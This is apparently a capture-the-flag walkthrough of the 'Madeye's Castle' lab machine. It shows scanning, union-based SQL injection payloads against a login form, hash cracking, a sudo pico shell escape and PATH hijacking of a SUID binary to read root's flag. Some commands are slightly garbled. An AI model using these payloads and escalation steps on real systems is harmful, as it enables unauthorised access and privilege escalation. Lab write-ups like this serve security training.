So lets dive in...
Began with a simple nmap scan to know about the target.
```bash
$ sudo nmap -T4 -sC -sS 10.10.50.42 > nmap.out 
$ cat nmap.out

We have smb port open lets explore that...
```bash
 smbclient -NL //10.10.50.42                                                                                                  1 тип

Hagrid told me that spells names are not good since they will not "rock you"
Hermonine loves historical text editors along with reading old books.
```
Looking the .note.txt file I know spellnames.txt were some sort of password reference. But I had no idea what they are or might be.
 
So lets enumerate forth.
Since port 80 is open its worth while to run a gobuster scan on it. 
```bash
sudo gobuster dir -u http://10.10.50.42 -w=/usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-small-directories.txt -e -o dir.backup.out
$ cat dir.out 
http://10.10.50.42/backup (Status: 301)
http://10.10.50.42/server-status (Status: 403)
```
We got a 301 hit on backup directory lets run gobuster on it again.
```bash
sudo gobuster dir -u http://10.10.50.42/backup/ -w=/usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-small-directories.txt -e -o dir.backup.out
$ cat dir.backup.out 
http://10.10.50.42/backup/email (Status: 200)
```

Found that there is virtual website ```hogwartz-castle.thm``` so add target ip to ```/etc/hosts/``` which is a login page and doest have default creds.
Lets try sql injections. Trying some basic injections we know its vulnerable to sql injections.
So first intercept requests using burp and save it.

<p align="center"><img src ="./Screenshots/2.png" width ="540"></p>

Lets try sqlmap to know the type of working payloads.
```bash
$ sqlmap -r requests --dump-all --level 5 --risk 3 --thread 8
...

    Type: UNION query

```
So sqlmap gave us there is a user table and 4 columns and user field is vulnerable to union injections.
lets craft some union based sql queries.
``` 
user= Harry' UNION ALL SELECT 1,2,3,4 from users --&password=potter
```
This query gave a error response ```{"error":"The password for 1 is incorrect! 4"}``` which means first column must be usernames and forth column must be password.
Bruteforcing column names in burpsuite with query ```user=Fallen'+UNION+ALL+SELECT+1,2,3,+from+users--&password=hey```
and found some column names.
 
<p align="center"><img src ="./Screenshots/3.png" width ="540"></p>

Now trying sql queries with found column names.
```
user=Harry' UNION ALL SELECT name,2,3,password from users where rowid='2'--&password=potter
{"error":"The password for Harry Turner is incorrect! b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885"}

user=Harry' UNION ALL SELECT name,2,3,notes from users where rowid='2'--&password=potter
{"error":"The password for Harry Turner is incorrect! My linux username is my first name, and password uses best64"}
```
Now after trying every way to crack the hash with base 64 as hinted. I googled and found that hashcat has its own rule named - 'best64'.
Converting the hash with best64 and cracking it with spellnames.txt we have the password.
```bash
$ hashcat --stdout -r /usr/share/hashcat/rules/best64.rule spellnames.txt > passwd.txt
$ sudo hashcat -m1700 -O hash passwd.txt 
...

Since port 22 is open, SSH into the machine.
```bash
$ ssh harry@10.10.41.99                                                                                                   148 ? 2 ?

### Privilege Escalation.

Check whether harry user is in sudoers group.
```bash
harry@hogwartz-castle:~$ sudo -l
[sudo] password for harry: 
Matching Defaults entries for harry on hogwartz-castle:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User harry may run the following commands on hogwartz-castle:
    (hermonine) /usr/bin/pico
    (hermonine) /usr/bin/pico
```
So user harry can run pico as hermonine user. Lets Exploit it, visit [GTFOBins](https://gtfobins.github.io/) 
and search for pico bin exploits.

<p align="center"><img src ="./Screenshots/4.png" width ="540"></p>

```bash
harry@hogwartz-castle:~$ sudo -u hermonine /usr/bin/pico
```
We have a shell as hermonine user. Stabalize it using python one-liner and cat out user2.txt.
```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
hermonine@hogwartz-castle:/home/hermonine$ ls
user2.txt
hermonine@hogwartz-castle:/home/hermonine$cat user2.txt
RME{********************************}
```
Now lets check for any access to root executable with hermonine user.
```bash
hermonine@hogwartz-castle:/home/hermonine$ find / -perm -u=s 2>/dev/null

/srv/time-turner/swagger
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newuidmap
/usr/bin/traceroute6.iputils
...
/bin/umount
/bin/fusermount
/bin/su
/bin/ping
/bin/mount
```
Nothing stands out except ```/srv/time-turner/swagger``` rest all are defaults.
Looks like its a binary file lets copy it to our machine and analyse it.
```bash
$ scp kali@10.8.155.126:/home/kali/Desktop/THM/Rooms/MadeyeCastle/ srv/time-turner/swagger
$ strings swagger .txt
...

Nice use of the time-turner!
This system architecture is 
uname -p
Guess my number: 
Nope, that is not what I was thinking
I was thinking of %d
;*3$"
...
```
From the above code it is obvious that on Correct guess it will call uname -p command.
lets create a malicious code to be executed.

```bash
hermonine@hogwartz-castle:/home/hermonine$  echo '123'|/srv/time-turner/swagger| awk -F 'of ' '{print $2}' |/srv/time-turner/swagger

Guess my number: Nice use of the time-turner!
This system architecture is x86_64
```
We were able to guess correct number now its turn to cat out our flag. ove to tmp directory and create a file uname with the command to be executed
on successful binary execution. I tried to get a shell or even change the password of root user bu didn't work.

```bash
hermonine@hogwartz-castle:/home/hermonine$ cd /tmp
hermonine@hogwartz-castle:/home/hermonine$ echo 'cat /root/root.txt'>uname
hermonine@hogwartz-castle:/home/hermonine$ chmod +x uname
hermonine@hogwartz-castle:/home/hermonine$ export PATH=/tmp:$uname
hermonine@hogwartz-castle:/home/hermonine$ echo '123'|/srv/time-turner/swagger| awk -F 'of ' '{print $2}' |/srv/time-turner/swagger

Guess my number: Nice use of the time-turner!
This system architecture is RME{********************************}

With this Madeye's Castle is Finished!!
